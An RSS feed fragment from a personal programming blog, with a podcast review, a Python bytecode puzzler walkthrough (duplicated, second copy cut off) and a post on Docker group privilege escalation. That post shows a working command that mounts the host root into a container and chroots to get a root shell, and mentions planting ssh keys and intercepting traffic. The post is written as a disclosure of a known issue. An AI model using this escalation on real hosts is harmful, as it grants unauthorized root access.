&lt;p&gt;&lt;code&gt;obj&lt;/code&gt; can implement &lt;code&gt;method_mssing?&lt;/code&gt; method to implement generic method dispatcher. With Python, you can achieve the same thing with &lt;code&gt;__getattribute__&lt;/code&gt; magic method.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Docker...root...root...Docker (a.k.a. the docker group is a backdoor)</title>
      <link>http://blog.idempotent.ca/2016/05/03/docker...root...root...docker-a.k.a.-the-docker-group-is-a-backdoor/</link>
      <pubDate>Tue, 03 May 2016 22:52:41 -0400</pubDate>
      
      <guid>http://blog.idempotent.ca/2016/05/03/docker...root...root...docker-a.k.a.-the-docker-group-is-a-backdoor/</guid>
      <description>&lt;p&gt;While working with docker related stuff and when I use volume mount to a subdir of my home dir, I always come across the issue of the container littering folders with &lt;code&gt;root:root&lt;/code&gt; permission in my home folder and then I have to &lt;code&gt;sudo rm ...&lt;/code&gt; it, for example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;docker run -d $(pwd)/data:/var/lib/mysql/data mysql
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It always annoys me but today, it came to me like an epiphany that this is actually a pretty severe security vulnerability.&lt;/p&gt;

&lt;p&gt;At &lt;code&gt;$DAYJOB&lt;/code&gt;, our build machines and staging hosts are all locked down, so we developers don&amp;rsquo;t have &lt;code&gt;sudo&lt;/code&gt; privilege to run anything &lt;strong&gt;except&lt;/strong&gt; &lt;code&gt;/usr/bin/docker&lt;/code&gt;, so it&amp;rsquo;s &lt;code&gt;/etc/sudoers&lt;/code&gt; file have something to the effect of:&lt;/p&gt;

&lt;p&gt;%dev            ALL =(root) NOPASSWD: /usr/bin/docker&lt;/p&gt;

&lt;p&gt;This is fine and dandy for other commands, but with &lt;code&gt;docker&lt;/code&gt;, when you run it with &lt;code&gt;sudo&lt;/code&gt;, you &lt;em&gt;are&lt;/em&gt; essentially &lt;code&gt;root&lt;/code&gt;, inside the container and outside. I thought: what if I create an image, and volume mount &lt;code&gt;/&lt;/code&gt; into the image? Wouldn&amp;rsquo;t that give me root privilege to everything?&lt;/p&gt;

&lt;p&gt;A quick proof of concept proved my suspicion:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker run -it --rm -v /:/mnt alpine /bin/sh
/ # chroot /mnt
root@0a327dad801b:/# ls /
bin   config   dev  home        initrd.img.old  lib64  logs        media  opt   root  sbin     srv  syslog-logs  usr  vmlinuz
boot  content  etc  initrd.img  lib             local  lost+found  mnt    proc  run   selinux  sys  tmp          var  vmlinuz.old
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hey, I have a &lt;em&gt;root shell&lt;/em&gt; on the host machine where my user account has only limited permissions. Once I&amp;rsquo;m root, the possibility is endless: I can &lt;code&gt;cd&lt;/code&gt; into &lt;code&gt;/home/opsuser&lt;/code&gt;, and insert an ssh key I own to their &lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt; file and suddenly I can &lt;code&gt;ssh&lt;/code&gt; as that user without this docker backdoor. I can setup a MITMproxy and capture all traffic on the host. I can inspect the log files I&amp;rsquo;m not suppsed to see, etc etc etc. Of course I&amp;rsquo;m not going to do that, but just thinking of it gives me chills, and what if some rogue employee discovers this and either steals my account credentials or impersonates me?&lt;/p&gt;

&lt;p&gt;Anyhow, I thought that was quite a revelation, and was about to email security@docker.com, until I searched online. Apparently, this is a &lt;a href=&#34;http://reventlov.com/advisories/using-the-docker-command-to-root-the-host&#34;&gt;known&lt;/a&gt; &lt;a href=&#34;https://fosterelli.co/privilege-escalation-via-docker.html&#34;&gt;security vulnerability&lt;/a&gt; that Docker does not consider as such. Once again, the Internet beat me to it :(&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Software Engineering Podcasts Review</title>
      <link>http://blog.idempotent.ca/2016/04/28/software-engineering-podcasts-review/</link>
      <pubDate>Thu, 28 Apr 2016 22:12:59 -0400</pubDate>
      
      <guid>http://blog.idempotent.ca/2016/04/28/software-engineering-podcasts-review/</guid>
      <description>

&lt;p&gt;UPDATE: I&amp;rsquo;ve got a lot of great comments here and on &lt;a href=&#34;https://redd.it/4hycnz&#34;&gt;reddit&lt;/a&gt;. Thanks everyone for the suggestions.&lt;/p&gt;

&lt;p&gt;As software developers, we need to always keep learning and keep ourselves up-to-date with what&amp;rsquo;s happening in the industry. Listening to podcasts is a great way to do so for myself since I have a 2-hour commute every day. In this blog post I&amp;rsquo;m going to review software engineering podcasts that I frequently listen to and hopefully this post will be remotely useful to anyone looking for software podcasts.&lt;/p&gt;

&lt;h1 id=&#34;disclaimer&#34;&gt;Disclaimer&lt;/h1&gt;

&lt;p&gt;I&amp;rsquo;m not affiliated with any of the podcasts. Any comments I have on the podcasts are highly subjective. I&amp;rsquo;m mostly a backend web developer interested in devops, distributed systems and scalability, so I don&amp;rsquo;t subscribe to podcasts that are dedicated to iOS/Android development.&lt;/p&gt;

&lt;h1 id=&#34;software-engineering-daily&#34;&gt;Software Engineering Daily&lt;/h1&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/sed.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;strong&gt;Link:&lt;/strong&gt; &lt;a href=&#34;http://softwareengineeringdaily.com/&#34;&gt;http://softwareengineeringdaily.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Frequency:&lt;/strong&gt; everyday&lt;/p&gt;

&lt;p&gt;This has been a revelation for me since I discovered it at the end of last year (2015). It brings an episode of in-depth interview every day without fail, which speaks volume to the host &lt;a href=&#34;https://twitter.com/the_prion&#34;&gt;Jeff Meyerson&lt;/a&gt;&amp;rsquo;s passion for technology. The topics are wide-ranged, from distributed systems to operations (e.g., production monitoring) tobig data and everything in between. It&amp;rsquo;s very-well prepared and the guests are usually highly knowledgable of the subject.&lt;/p&gt;

&lt;p&gt;I highly recommend this podcast.&lt;/p&gt;

&lt;h1 id=&#34;software-engineering-radio&#34;&gt;Software Engineering Radio&lt;/h1&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/se-radio-logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;strong&gt;Link:&lt;/strong&gt; &lt;a href=&#34;http://www.se-radio.net/&#34;&gt;http://www.se-radio.net/&lt;/a&gt;
&lt;strong&gt;Frequency:&lt;/strong&gt; Semi-monthly&lt;/p&gt;

&lt;p&gt;This is one of the first podcasts I subscribed to. It&amp;rsquo;s published by IEEE computer society so it has a high profile. Sometimes the show gets a little too academic that it disconnects with what programmers do on a day-to-day basis. Don&amp;rsquo;t get me wrong, this is an awesome show, and very insightful. However, depending on the topics or the guests, you may or may not get as much out of the show. That said, however, this is still a very solid show with interesting topics and in-depth discussions.&lt;/p&gt;

&lt;h1 id=&#34;the-changelog&#34;&gt;The Changelog&lt;/h1&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/the-changelog.svg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;strong&gt;Link:&lt;/strong&gt; &lt;a href=&#34;https://changelog.com/&#34;&gt;https://changelog.com/&lt;/a&gt;
&lt;strong&gt;Frequency:&lt;/strong&gt; weekly-ish&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve been following thechangelog show from its infancy. The show was on hiatus for a while but since they&amp;rsquo;re are back a few years ago, they&amp;rsquo;ve been in full gear, putting together tons of excellent interviews. Its primary focus is on open source projects and have put lots of interesting projects on my tech radar, including Golang and Docker. The depth of the show has been improving as well, and show is not just &amp;ldquo;hey there&amp;rsquo;s this project you probably haven&amp;rsquo;t heard about but you should&amp;rdquo;. The hosts are able to ask some insightful questions and the guests are usually able to provide detailed answers. I also like the show for the fact that you can open suggestions via &lt;a href=&#34;https://github.com/thechangelog/ping&#34;&gt;github issue link&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&#34;security-now&#34;&gt;Security Now&lt;/h1&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/sn1400.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;strong&gt;Link:&lt;/strong&gt; &lt;a href=&#34;https://twit.tv/shows/security-now&#34;&gt;https://twit.tv/shows/security-now&lt;/a&gt;
&lt;strong&gt;Frequency:&lt;/strong&gt; Weekly&lt;/p&gt;

&lt;p&gt;Another long-time tech podcast and a prominent one from the popular twit.tv network. It&amp;rsquo;s going on for more than 10 years filling a unique niche. I learned a lot from Steve Gibson, the host. He has a knack of explaining security topics in plain words. His series on &lt;a href=&#34;https://twit.tv/shows/security-now/episodes/309&#34;&gt;How the Internet works&lt;/a&gt; is highly recommended. However, nowadays, the show tends to have trouble staying on topic, with so many non-security related chitchats. However, it&amp;rsquo;s still a good source to stay informed on security news.&lt;/p&gt;

&lt;h1 id=&#34;coderradio&#34;&gt;CoderRadio&lt;/h1&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/coderradio.jpeg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;strong&gt;Link:&lt;/strong&gt; &lt;a href=&#34;http://www.jupiterbroadcasting.com/show/coderradio/&#34;&gt;http://www.jupiterbroadcasting.com/show/coderradio/&lt;/a&gt;
&lt;strong&gt;Frequency:&lt;/strong&gt; Weekly&lt;/p&gt;

&lt;p&gt;I started listening to Coder Radio after I discovered &lt;a href=&#34;http://www.jupiterbroadcasting.com/&#34;&gt;Jupiter Broadcasting&lt;/a&gt; by way of &lt;a href=&#34;http://www.jupiterbroadcasting.com/show/linuxactionshow/&#34;&gt;Linux Action Show&lt;/a&gt;. The host Michael Dominic is an independent developer, so he has some insight on how to run a consulting business and how to do contract negotiation. While I don&amp;rsquo;t fancy being a software contractor at this point of my career, I do appreciate the information. However, this show gets facetious, snarky and dismissive really quickly. I don&amp;rsquo;t mind that occasionally but sometimes I feel the host is over-doing it.&lt;/p&gt;

&lt;p&gt;I do get some value out of the show but it&amp;rsquo;s not known for its depth.&lt;/p&gt;

&lt;h1 id=&#34;turing-incomplete&#34;&gt;Turing-InComplete&lt;/h1&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/turing.png&#34; /&gt;
    
    
&lt;/figure&gt;

&lt;strong&gt;link:&lt;/strong&gt; &lt;a href=&#34;http://turing.cool/&#34;&gt;http://turing.cool/&lt;/a&gt;
&lt;strong&gt;Frequency:&lt;/strong&gt; No fixed schedule&lt;/p&gt;

&lt;p&gt;This is mostly a talk show among 4 software engineer friends. They have a good diversity: frontend/backend, devops, contractor and so on. They are all enthusiastic about software. The most I get out of the show is inspiration. They&amp;rsquo;re always experimenting with new technology: elixir, clojurescript, new hashicorp tools etc. Listening to their podcast makes me want to learn and be a better software engineer. In the first dozen of episodes, they have a single topic for each show such as TDD, code review, pair programming etc, but as time goes on, the show becomes a grabbag of everything and it gets chatty without a ton of substance. It&amp;rsquo;s a casual conversation among friends having fun, and I guess that could be viewed as a strength.&lt;/p&gt;

&lt;h1 id=&#34;talk-python-to-me&#34;&gt;Talk Python to Me&lt;/h1&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/talkpython.jpg&#34; /&gt;
    
    
&lt;/figure&gt;

&lt;strong&gt;link:&lt;/strong&gt; &lt;a href=&#34;https://talkpython.fm/&#34;&gt;https://talkpython.fm/&lt;/a&gt;
&lt;strong&gt;Frequency:&lt;/strong&gt; weekly&lt;/p&gt;

&lt;p&gt;This is a Python-specific podcast hosted by Michael Kennedy. Being primarily a Python developer, I followed the podcast since its infancy. The show started off with a couple really strong interviews with interviewees like Mike Bayer, Kenneith Reitz, Armin Ronacher and David Beazley. The show has good depth, although sometimes it could be a bit stronger. There are gems like the one &lt;a href=&#34;https://talkpython.fm/episodes/show/22/cpython-internals-and-learning-python-with-pythontutor.com&#34;&gt;episode&lt;/a&gt; with Philip Guo which lead me to Philip&amp;rsquo;s excellent CPython internals video series. Overall, a really solid podcast.&lt;/p&gt;

&lt;h1 id=&#34;podcast-init&#34;&gt;Podcast.__init__&lt;/h1&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/podcast_init_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;

&lt;strong&gt;link:&lt;/strong&gt; &lt;a href=&#34;http://podcastinit.com/&#34;&gt;http://podcastinit.com/&lt;/a&gt;
&lt;strong&gt;Frequency:&lt;/strong&gt; weekly&lt;/p&gt;

&lt;p&gt;Another Python specific podcast started around the same time as Talk Python to Me. Another solid show and I do find it&amp;rsquo;s a little bit more in-depth than TalkPython but it might just be my impression.&lt;/p&gt;

&lt;h1 id=&#34;scale-your-code&#34;&gt;Scale Your Code&lt;/h1&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/scaleyourcode.jpg&#34; /&gt;
    
    
&lt;/figure&gt;

&lt;strong&gt;link:&lt;/strong&gt; &lt;a href=&#34;https://scaleyourcode.com/&#34;&gt;https://scaleyourcode.com/&lt;/a&gt;
&lt;strong&gt;Frequency:&lt;/strong&gt; semi-monthly&lt;/p&gt;

&lt;p&gt;I learned about this podcast on an &lt;a href=&#34;http://softwareengineeringdaily.com/2016/04/27/scale-code-christophe-limpalair/&#34;&gt;episode&lt;/a&gt; of another podcast software engineering daily. The host Christophe Limpalair is a super energetic and passionate guy. It&amp;rsquo;s inspiring to hear his journey. I&amp;rsquo;ve only discovered it not too long ago, but the topics are very relevant to what I do and what I interest in. I can&amp;rsquo;t wait to dive into its archive of back episodes.&lt;/p&gt;

&lt;h1 id=&#34;fullstack-radio&#34;&gt;FullStack Radio&lt;/h1&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/fullstack.jpg&#34; /&gt;
    
    
&lt;/figure&gt;

&lt;strong&gt;link:&lt;/strong&gt; &lt;a href=&#34;http://www.fullstackradio.com/&#34;&gt;http://www.fullstackradio.com/&lt;/a&gt;
&lt;strong&gt;Frequency:&lt;/strong&gt; semi-monthly&lt;/p&gt;

&lt;p&gt;Another podcast I discovered recently. I&amp;rsquo;ve only listened to one &lt;a href=&#34;http://www.fullstackradio.com/38&#34;&gt;episode&lt;/a&gt; so far but I&amp;rsquo;m very impressed by the depth of the show. It&amp;rsquo;s like listening to a technical discussion between two colleagues. The host is not simply an echoing chamber but he&amp;rsquo;s able to provide many counter points, such as discussion about trade-offs. Great stuff!&lt;/p&gt;

&lt;p&gt;What are your favourite or most often listened to software podcasts?&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Use Python bytecode to solve puzzler</title>
      <link>http://blog.idempotent.ca/2015/09/03/use-python-bytecode-to-solve-puzzler/</link>
      <pubDate>Thu, 03 Sep 2015 22:16:36 -0400</pubDate>
      
      <guid>http://blog.idempotent.ca/2015/09/03/use-python-bytecode-to-solve-puzzler/</guid>
      <description>

&lt;h2 id=&#34;learning-python-internals&#34;&gt;Learning Python Internals&lt;/h2&gt;

&lt;p&gt;Recently I stumbled upon &lt;a href=&#34;https://www.youtube.com/playlist?list=PLwyG5wA5gIzgTFj5KgJJ15lxq5Cv6lo_0&#34;&gt;this wonderful set of videos on Python interpreter internals&lt;/a&gt;. (Thanks to &lt;a href=&#34;http://pgbovine.net/&#34;&gt;Philip Guo&lt;/a&gt; for creating them and thanks to Michael Kennedy (@mkennedy) and his &lt;a href=&#34;http://talkpython.fm/&#34;&gt;Talk Python to me&lt;/a&gt; show that brought this on my radar)&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve been using Python for about ten years but I&amp;rsquo;ve never really truly been able to understand how the interpreter works, nor was I familiar with the Python virtual machine or the bytecode. These videos may just be the extra help I needed to get me started at the internals of Python.&lt;/p&gt;

&lt;p&gt;So far, I&amp;rsquo;ve only watched 2 lectures and I&amp;rsquo;m already learning a lot. I learned where to find a list of opcodes in the source code, where the main eval loop is, and what internal states the Python virtual machine keeps.&lt;/p&gt;

&lt;p&gt;Then I thought to myself, why not use this new found power to solve some Python mysterious that have been puzzling me?&lt;/p&gt;

&lt;h2 id=&#34;the-puzzler&#34;&gt;The puzzler&lt;/h2&gt;

&lt;p&gt;A few days ago, one of my former co-workers posted this puzzler:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;(a, b) = a[b] = {}, 5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What are the values of &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; after the assignment? Well, it&amp;rsquo;s not obvious what the order of assignment it is going to be. Putting it in the REPL gives us this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; (a, b) = a[b] = {}, 5
&amp;gt;&amp;gt;&amp;gt; a
{5: ({...}, 5)}
&amp;gt;&amp;gt;&amp;gt; a[5]
({5: ({...}, 5)}, 5)
&amp;gt;&amp;gt;&amp;gt; a[5][0]
{5: ({...}, 5)}
&amp;gt;&amp;gt;&amp;gt; a[5][0][5]
({5: ({...}, 5)}, 5)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;OK, so there appears to be a circular reference going on here. The object that &lt;code&gt;a&lt;/code&gt; refers to has an element that refers to the object that &lt;code&gt;a&lt;/code&gt; refers to and so on and so forth. Now, the question is, how did the circular reference get there?&lt;/p&gt;

&lt;p&gt;Well, all Python source code eventually get compiled down to bytecode and executed on the virtual machine. In order to understand what that line actually does, we need to look at the byte code.&lt;/p&gt;

&lt;p&gt;It turns out that Python comes with a module to disassemble source code into byte codes (assembly for the virtual machine):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ python -m dis
a, b = a[5] = {}, 5
^D
  1           0 BUILD_MAP                0
              3 LOAD_CONST               0 (5)
              6 BUILD_TUPLE              2
              9 DUP_TOP
             10 UNPACK_SEQUENCE          2
             13 STORE_NAME               0 (a)
             16 STORE_NAME               1 (b)
             19 LOAD_NAME                0 (a)
             22 LOAD_CONST               0 (5)
             25 STORE_SUBSCR
             26 LOAD_CONST               1 (None)
             29 RETURN_VALUE
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alright, so that humble little line of code is actually 12 instructions for the Python virtual machine. Each instruction manipulates the virtual machine&amp;rsquo;s internal state in some way. CPython is a stack-based interpreter, which means certain instructions puts values on the stack and other instructions consume them from the stack.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s go through the instructions:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;0 BUILD_MAP                0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;First off, it tells the interpreter to make a map object and put it on the value stack. After this instruction, our value stack looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+----+
| {} |
+----+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next up:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;3 LOAD_CONST               0 (5)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This loads a constant (&lt;code&gt;5&lt;/code&gt;) on the stack.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+----+
| {} |
+----+
| 5  |
+----+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;6 BUILD_TUPLE              2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This instruction builds a &lt;code&gt;PyTuple&lt;/code&gt; object of size &lt;code&gt;2&lt;/code&gt;, which is in the argument of the opcode. It consumes the top &lt;code&gt;2&lt;/code&gt; things on the stack and make a 2-tuple using these values and put the result tuple on the value stack:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+---------+
| ({}, 5) |
+---------+
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;9 DUP_TOP
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next we have the &lt;code&gt;DUP_TOP&lt;/code&gt; instruction. It probably stands for &amp;ldquo;duplicate the top of the stack&amp;rdquo;, and reading the corresponding code in the eval loop, this seems to be what it&amp;rsquo;s doing: it gets the object from the top of the stack without popping it off and push the value on the stack, while incrementing the refcount of the object.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s worth noting that this only duplicates the tuple object. The elements inside the tuple are of type &lt;code&gt;*PyObject&lt;/code&gt;, which are pointers to the corresponding values (the dict and the integer), and are not duplicated by this instruction. Here&amp;rsquo;s the value stack after this instruction:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+---------+
| ({}, 5) |
+---------+
| ({}, 5) |
+---------+
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;10 UNPACK_SEQUENCE          2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next instruction is &lt;code&gt;UNPACK_SEQUENCE&lt;/code&gt; with argument &lt;code&gt;2&lt;/code&gt;. This will first pop the stack, so &lt;code&gt;({}, 5)&lt;/code&gt; is off the stack, and then push each element from the tuple on the stack in reverse order. After this instruction, the stack will be:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+---------+
| ({}, 5) |
+---------+
|   5     |
+---------+
|   {}    |
+---------+
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;13 STORE_NAME               0 (a)
16 STORE_NAME               1 (b)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next two instructions deal with &amp;ldquo;names&amp;rdquo;, which are variables for the scope of the frame. &lt;code&gt;STORE_NAME a&lt;/code&gt; will pop the stack, and point &lt;code&gt;a&lt;/code&gt; to the value, and similarily for &lt;code&gt;STORE_NAME b&lt;/code&gt;. After this instruction, there will be two bindings in the frame: &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; and the stack will be back to having only one element, the tuple:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;stack:
+---------+
| ({}, 5) |
+---------+

bindings:
a &amp;lt;- {}
b &amp;lt;- 5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next two instructions:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;19 LOAD_NAME                0 (a)
22 LOAD_CONST               0 (5)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;LOAD_NAME a&lt;/code&gt; will push the value that the variable is bound to on the stack, so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;stack:
+---------+
| ({}, 5) |
+---------+
|    {}   |
+---------+

bindings:
a &amp;lt;- {}
b &amp;lt;- 5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and &lt;code&gt;LOAD_CONST 5&lt;/code&gt;, as we&amp;rsquo;ve seen before, simply pushes the constant &lt;code&gt;5&lt;/code&gt; on the stack:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;stack:
+---------+
| ({}, 5) |
+---------+
|    {}   |
+---------+
|     5   |
+---------+

bindings:
a &amp;lt;- {}
b &amp;lt;- 5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;25 STORE_SUBSCR
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is where the magic happens. &lt;code&gt;STORE_SUBSCR&lt;/code&gt; is an instruction to set element on the dictionary given the index. Here&amp;rsquo;s the code that handles this opcode in the eval loop:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;TARGET_NOARG(STORE_SUBSCR)
{
    w = TOP();
    v = SECOND();
    u = THIRD();
    STACKADJ(-3);
    /* v[w] = u */
    err = PyObject_SetItem(v, w, u);
    Py_DECREF(u);
    Py_DECREF(v);
    Py_DECREF(w);
    if (err == 0) DISPATCH();
    break;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, &lt;code&gt;TOP&lt;/code&gt;, &lt;code&gt;SECOND&lt;/code&gt;, &lt;code&gt;THIRD&lt;/code&gt; are macros that take values off of the value stack. Given our state of the virtual machine:
* &lt;code&gt;w = TOP()&lt;/code&gt; =&amp;gt; &lt;code&gt;w = 5&lt;/code&gt;
* &lt;code&gt;v = SECOND()&lt;/code&gt; =&amp;gt; &lt;code&gt;v = {}&lt;/code&gt;
* &lt;code&gt;w = THIRD()&lt;/code&gt; =&amp;gt; &lt;code&gt;w = ({}, 5)&lt;/code&gt;, but keep in mind, the first element in &lt;code&gt;w&lt;/code&gt; (the tuple) is actually the same object &lt;code&gt;v&lt;/code&gt; is pointing to.&lt;/p&gt;

&lt;p&gt;Thus, calling &lt;code&gt;PyObject_SetItem(v, w, u)&lt;/code&gt; sets &lt;code&gt;v[w] = u&lt;/code&gt; =&amp;gt; &lt;code&gt;v[5] = (v, 5)&lt;/code&gt;, and there a circular reference is born!&lt;/p&gt;

&lt;p&gt;From the sequence of operation, we can tell the order by which the assignments were executed:
1. &lt;code&gt;a, b = {}, 5&lt;/code&gt;
2. &lt;code&gt;a[5] = ({}, 5)&lt;/code&gt;, with &lt;code&gt;a&lt;/code&gt; refering to the dictionary&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Diving into the Python implementation is the next level ninjary that may come in handy in some cases. Granted, no one is going to write production code like the one in the puzzler, but stepping through and visualizing the virtual machine is a pretty useful and fun experience that makes me appreciate more the language I use everyday.&lt;/p&gt;

&lt;p&gt;Again, thanks to Philip Guo for the videos and Michael Kennedy for the podcast. Also, checkout Professor Guo&amp;rsquo;s &lt;a href=&#34;http://www.pythontutor.com/&#34;&gt;python tutor&lt;/a&gt; for visualizing how code is run.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Use Python bytecode to solve puzzler</title>
      <link>http://blog.idempotent.ca/starred/2015-09-03-use-python-bytecode-to-solve-puzzler/</link>
      <pubDate>Thu, 03 Sep 2015 22:16:36 -0400</pubDate>
      
      <guid>http://blog.idempotent.ca/starred/2015-09-03-use-python-bytecode-to-solve-puzzler/</guid>
      <description>

&lt;h2 id=&#34;learning-python-internals&#34;&gt;Learning Python Internals&lt;/h2&gt;

&lt;p&gt;Recently I stumbled upon &lt;a href=&#34;https://www.youtube.com/playlist?list=PLwyG5wA5gIzgTFj5KgJJ15lxq5Cv6lo_0&#34;&gt;this wonderful set of videos on Python interpreter internals&lt;/a&gt;. (Thanks to &lt;a href=&#34;http://pgbovine.net/&#34;&gt;Philip Guo&lt;/a&gt; for creating them and thanks to Michael Kennedy (@mkennedy) and his &lt;a href=&#34;http://talkpython.fm/&#34;&gt;Talk Python to me&lt;/a&gt; show that brought this on my radar)&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve been using Python for about ten years but I&amp;rsquo;ve never really truly been able to understand how the interpreter works, nor was I familiar with the Python virtual machine or the bytecode. These videos may just be the extra help I needed to get me started at the internals of Python.&lt;/p&gt;

&lt;p&gt;So far, I&amp;rsquo;ve only watched 2 lectures and I&amp;rsquo;m already learning a lot. I learned where to find a list of opcodes in the source code, where the main eval loop is, and what internal states the Python virtual machine keeps.&lt;/p&gt;

&lt;p&gt;Then I thought to myself, why not use this new found power to solve some Python mysterious that have been puzzling me?&lt;/p&gt;

&lt;h2 id=&#34;the-puzzler&#34;&gt;The puzzler&lt;/h2&gt;

&lt;p&gt;A few days ago, one of my former co-workers posted this puzzler:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;(a, b) = a[b] = {}, 5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What are the values of &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; after the assignment? Well, it&amp;rsquo;s not obvious what the order of assignment it is going to be. Putting it in the REPL gives us this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; (a, b) = a[b] = {}, 5
&amp;gt;&amp;gt;&amp;gt; a
{5: ({...}, 5)}
&amp;gt;&amp;gt;&amp;gt; a[5]
({5: ({...}, 5)}, 5)
&amp;gt;&amp;gt;&amp;gt; a[5][0]
{5: ({...}, 5)}
&amp;gt;&amp;gt;&amp;gt; a[5][0][5]
({5: ({...}, 5)}, 5)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;OK, so there appears to be a circular reference going on here. The object that &lt;code&gt;a&lt;/code&gt; refers to has an element that refers to the object that &lt;code&gt;a&lt;/code&gt; refers to and so on and so forth. Now, the question is, how did the circular reference get there?&lt;/p&gt;

&lt;p&gt;Well, all Python source code eventually get compiled down to bytecode and executed on the virtual machine. In order to understand what that line actually does, we need to look at the byte code.&lt;/p&gt;

&lt;p&gt;It turns out that Python comes with a module to disassemble source code into byte codes (assembly for the virtual machine):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ python -m dis
a, b = a[5] = {}, 5
^D
  1           0 BUILD_MAP                0
              3 LOAD_CONST               0 (5)
              6 BUILD_TUPLE              2
              9 DUP_TOP
             10 UNPACK_SEQUENCE          2
             13 STORE_NAME               0 (a)
             16 STORE_NAME               1 (b)
             19 LOAD_NAME                0 (a)
             22 LOAD_CONST               0 (5)
             25 STORE_SUBSCR
             26 LOAD_CONST               1 (None)
             29 RETURN_VALUE
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alright, so that humble little line of code is actually 12 instructions for the Python virtual machine. Each instruction manipulates the virtual machine&amp;rsquo;s internal state in some way. CPython is a stack-based interpreter, which means certain instructions puts values on the stack and other instructions consume them from the stack.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s go through the instructions:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;0 BUILD_MAP                0
&lt;/code&gt;&lt;/pre&gt;

